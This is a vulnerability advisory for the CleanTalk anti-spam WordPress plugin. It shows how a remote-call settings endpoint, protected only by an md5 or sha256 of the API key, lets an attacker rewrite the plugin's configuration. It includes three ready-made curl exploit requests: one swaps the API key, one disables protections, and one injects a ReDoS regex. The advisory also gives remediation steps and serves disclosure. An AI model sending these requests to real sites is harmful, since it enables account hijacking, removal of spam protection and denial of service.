# CTSP-004: Remote Call Settings Overwrite Including API Key and Regex Injection

## Severity: High (CVSS ~7.2)

## Summary

The `action__update_settings` remote call passes the entire `$_REQUEST` superglobal to `apbct_rc__update_settings()`, which overwrites any matching plugin setting from the request parameters. Combined with the weak token authentication (md5 or sha256 of the API key), an attacker who obtains or brute-forces the API key can fully reconfigure the plugin -- including swapping the API key, disabling all protection, and injecting malicious regex patterns that cause denial of service.

## Affected Code

### Remote Call Handler (RemoteCalls.php, lines 319-322)

```php
public static function action__update_settings()
{
    return apbct_rc__update_settings($_REQUEST);
}
```

### Settings Update Function (cleantalk.php, lines 2339-2358)

```php
function apbct_rc__update_settings($source)
{
    global $apbct;
    foreach ( $apbct->default_settings as $setting => $def_value ) {
        if ( array_key_exists($setting, $source) ) {
            $var  = $source[$setting];
            $type = gettype($def_value);
            settype($var, $type);
            if ( $type === 'string' ) {
                $var = preg_replace(array('/=/', '/`/'), '', $var);
            }
            $apbct->settings[$setting] = $var;
        }
    }
    $apbct->save('settings');
    return true;
}
```

### Token Authentication (RemoteCalls.php, lines 627-643)

```php
private static function checkToken($token)
{
    global $apbct;
    $value_for_token = $apbct->api_key;
    return $value_for_token && (
        $token === strtolower(md5($value_for_token)) ||
        $token === strtolower(hash('sha256', $value_for_token))
    );
}
```

### Regex Injection Sink (cleantalk-public-validate.php, line 536)

```php
$exclusion_regexp = $apbct->settings['exclusions__fields'];
// ...
if (preg_match('/' . $exclusion_regexp . '/', $key) === 1) {
```

## Attack Scenarios

### 1. API Key Swap (Account Hijack)

```bash
curl -X POST "https://target.com/" \
  -d "spbc_remote_call_action=update_settings" \
  -d "spbc_remote_call_token=<md5_of_current_apikey>" \
  -d "plugin_name=antispam" \
  -d "apikey=attacker_controlled_key"
```

After this, the site's spam protection reports to and is controlled by the attacker's CleanTalk account.

### 2. Disable All Protection

```bash
curl -X POST "https://target.com/" \
  -d "spbc_remote_call_action=update_settings" \
  -d "spbc_remote_call_token=<md5_of_apikey>" \
  -d "plugin_name=antispam" \
  -d "forms__general_contact_forms_test=0" \
  -d "forms__registrations_test=0" \
  -d "forms__comments_test=0" \
  -d "data__protect_logged_in=0"
```

### 3. ReDoS via Regex Injection

```bash
curl -X POST "https://target.com/" \
  -d "spbc_remote_call_action=update_settings" \
  -d "spbc_remote_call_token=<md5_of_apikey>" \
  -d "plugin_name=antispam" \
  -d "exclusions__fields=(a+)+$" \
  -d "exclusions__fields__use_regexp=1"
```

Every subsequent form submission on the site will trigger catastrophic regex backtracking on field names matching the pattern, causing CPU exhaustion.

## Impact

- Full plugin configuration takeover
- Spam protection bypass for the entire site
- Denial of service via ReDoS
- API key theft enables further attacks (CTSP-005)

## Preconditions

- Attacker must know or brute-force the CleanTalk API key
- Token is md5(api_key) -- API keys are typically 20-char alphanumeric, making brute-force infeasible
- However, the `action__debug` remote call (also token-protected) leaks the first 2 and last 2 characters of the API key, reducing the search space
- API keys may be exposed in page source, error logs, or support tickets

## Remediation

1. Use a proper HMAC-based authentication with a separate secret, not md5(api_key)
2. Add rate limiting to token validation attempts
3. Validate `exclusions__fields` regex for safety before storing
4. Apply the same validation that `apbct_settings__validate()` uses (only called from admin UI, not from RC path)
